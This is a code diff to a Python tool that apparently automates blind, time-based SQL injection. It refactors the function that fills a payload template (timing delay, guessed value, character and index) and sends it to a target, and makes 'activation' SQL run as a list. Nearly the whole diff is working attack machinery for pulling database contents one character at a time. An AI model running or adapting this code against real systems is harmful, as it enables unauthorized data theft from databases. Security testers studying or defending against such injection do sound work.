@@ -113,39 +113,6 @@ def _prepare_value(value, escape_value, encode_value):
     return value
 
 
-def _call_with_value(config, search_value, prefix, char, index, is_exact, is_activation):
-    valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
-    time_threshold = config.get(_CONFIG_TIME_THRESHOLD, 0)
-
-    escape_value = config.get(_CONFIG_ESCAPE_VALUE, _CONFIG_DEFAULT_ESCAPE_VALUE)
-    encode_value = config.get(_CONFIG_ENCODE_VALUE, _CONFIG_DEFAULT_ENCODE_VALUE)
-
-    search_value = _prepare_value(search_value, escape_value, encode_value)
-    prefix = _prepare_value(prefix, escape_value, encode_value)
-    char = _prepare_value(char, escape_value, encode_value)
-
-    sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)
-
-    if is_exact:
-        inner = config[_CONFIG_SQL_EXACT]
-    elif is_activation:
-        inner = config[_CONFIG_SQL_ACTIVATION]
-    else:
-        search_value = search_value + ' || \'%\''
-        inner = config[_CONFIG_SQL_SEARCH]
-
-    value = valid_value + sql_payload \
-        .replace(':INNER:', inner) \
-        .replace(':WAIT:', str(time_threshold)) \
-        .replace(':VAL:', search_value) \
-        .replace(':PREFIX:', prefix) \
-        .replace(':CHR:', char) \
-        .replace(':IDX:', str(index)) \
-        .replace(':NXT:', str(index + 1))
-
-    return _call(config, value, time_threshold=time_threshold)
-
-
 def _extract_data(config):
     single_value = config.get(_CONFIG_SINGLE_VALUE_SEARCH, _CONFIG_DEFAULT_SINGLE_VALUE_SEARCH)
     detected_values = []
@@ -161,6 +128,9 @@ def _extract_data(config):
     if last_resort_chars is not None:
         search_chars = search_chars + last_resort_chars
 
+    inner_exact = config.get(_CONFIG_SQL_EXACT, None)
+    inner_search = config.get(_CONFIG_SQL_SEARCH, None)
+
     detected_prefixes = ['']
     logging.info("Starting search...")
     while len(detected_prefixes) > 0:
@@ -168,7 +138,7 @@ def _extract_data(config):
         if blacklist_prefix is None or not prefix.upper().startswith(blacklist_prefix.upper()):
             if not single_value and len(prefix) > 0:
                 _logger.debug("Trying to see if {} is exact value".format(prefix))
-                if _call_with_value(config, prefix, '', '', 0, True, False):
+                if _call_with_value(config, inner_exact, prefix, '', '', 0, True):
                     _logger.debug("Detected value {}".format(prefix))
                     print('\r{}                                                                                        '
                           .format(prefix), end='\n')
@@ -197,11 +167,11 @@ def _extract_data(config):
 
                 print('\r' + print_message, end='')
 
-                is_correct = _call_with_value(config, prefix + ch, prefix, ch, len(prefix) + 1, False, False)
+                is_correct = _call_with_value(config, inner_search, prefix + ch, prefix, ch, len(prefix) + 1, False)
 
                 # Double check
                 if is_correct:
-                    is_correct = _call_with_value(config, prefix + ch, prefix, ch, len(prefix) + 1, False, False)
+                    is_correct = _call_with_value(config, inner_search, prefix + ch, prefix, ch, len(prefix) + 1, False)
 
                 if is_correct:
                     detected_prefixes.append(prefix + ch)
@@ -214,6 +184,34 @@ def _extract_data(config):
                 detected_values.append(prefix)
 
     return detected_values
+
+
+def _call_with_value(config, sql, search_value, prefix, char, index, is_exact):
+    valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
+    time_threshold = config.get(_CONFIG_TIME_THRESHOLD, 0)
+
+    escape_value = config.get(_CONFIG_ESCAPE_VALUE, _CONFIG_DEFAULT_ESCAPE_VALUE)
+    encode_value = config.get(_CONFIG_ENCODE_VALUE, _CONFIG_DEFAULT_ENCODE_VALUE)
+
+    search_value = _prepare_value(search_value, escape_value, encode_value)
+    prefix = _prepare_value(prefix, escape_value, encode_value)
+    char = _prepare_value(char, escape_value, encode_value)
+
+    sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)
+
+    if not is_exact:
+        search_value = search_value + ' || \'%\''
+
+    value = valid_value + sql_payload \
+        .replace(':INNER:', sql) \
+        .replace(':WAIT:', str(time_threshold)) \
+        .replace(':VAL:', search_value) \
+        .replace(':PREFIX:', prefix) \
+        .replace(':CHR:', char) \
+        .replace(':IDX:', str(index)) \
+        .replace(':NXT:', str(index + 1))
+
+    return _call(config, value, time_threshold=time_threshold)
 
 
 if __name__ == '__main__':
@@ -231,8 +229,12 @@ if __name__ == '__main__':
         _logger.info("Configuration: {}".format(_config))
         _sanity_call(_config)
         if _CONFIG_SQL_ACTIVATION in _config:
-            _logger.info("Running activation SQL")
-            _call_with_value(_config, '', '', '', 0, False, True)
+            activations = _config[_CONFIG_SQL_ACTIVATION]
+            if isinstance(activations, str):
+                activations = [activations]
+            for activation in activations:
+                _logger.info("Running activation SQL: {}".format(activation))
+                _call_with_value(_config, activation, '', '', '', 0, False)
         if _CONFIG_SQL_SEARCH in _config:
             data = _extract_data(_config)
             print()
